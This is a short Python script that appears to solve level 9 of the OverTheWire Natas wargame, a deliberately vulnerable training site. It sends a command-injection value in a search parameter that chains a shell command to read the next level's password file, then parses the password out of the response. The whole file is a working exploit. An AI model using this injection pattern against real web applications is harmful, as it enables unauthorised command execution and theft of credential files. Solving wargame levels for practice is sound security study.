import requests
from requests.auth import HTTPBasicAuth
import natas8solution

auth = HTTPBasicAuth('natas9', natas8solution.get_pass())
def get_pass():
    param = {'needle':'a > /dev/null; cat /etc/natas_webpass/natas10 #','submit':'Search'}
    r = requests.get('http://natas9.natas.labs.overthewire.org/', auth=auth, params=param)
    webcontent = r.text
   # print(webcontent)
    i = webcontent.find('Output:')+14
    s = webcontent[i:i+32]
    return s
if __name__ == "__main__":
    solution = get_pass()
    print(solution)
